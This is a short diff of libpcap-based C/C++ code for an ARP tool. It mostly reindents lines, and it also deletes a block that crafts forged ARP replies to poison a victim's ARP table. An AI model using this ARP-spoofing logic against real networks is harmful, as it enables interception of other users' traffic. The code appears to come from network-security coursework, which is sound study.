@@ -58,22 +58,9 @@ int send_packet(Session* a, int opcode){
         memcpy(arp->target_mac, zero_mac_addr, 6);
         memcpy(arp->target_ip, a->sender_ip, 4);
         break;
-        /* case 2 : get_target_mac */
+    /* case 2 : get_target_mac */
     case 2:
         memcpy(arp->target_ip, a->target_ip, 4);
-        break;
-        /* case 3 : poisoning ARP table */
-    case 3:
-        memcpy(ethernet->Dmac, a->sender_mac, 6);
-        memcpy(ethernet->Smac, my_mac_addr, 6);
-        memcpy(&ethernet->type, "\x08\x06", 2);
-
-        memcpy(arp->dummy, arp_dummy, 6);
-        memcpy(arp->opcode, arp_opcode_reply, 2);
-        memcpy(arp->sender_mac, my_mac_addr, 6);
-        memcpy(arp->sender_ip, a->target_ip, 4);
-        memcpy(arp->target_mac, a->sender_mac, 6);
-        memcpy(arp->target_ip, a->sender_ip, 4);
         break;
     }
     pcap_sendpacket(fp, const_cast<const unsigned char*>(packet1), 42);
@@ -86,8 +73,8 @@ int get_mac(Session* a, int opcode){
     char errbuf[PCAP_ERRBUF_SIZE];
     pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 10, errbuf);
     if (handle == nullptr) {
-      fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
-      return -1;
+        fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
+        return -1;
     }
     struct pcap_pkthdr* header;
     const u_char* packet;
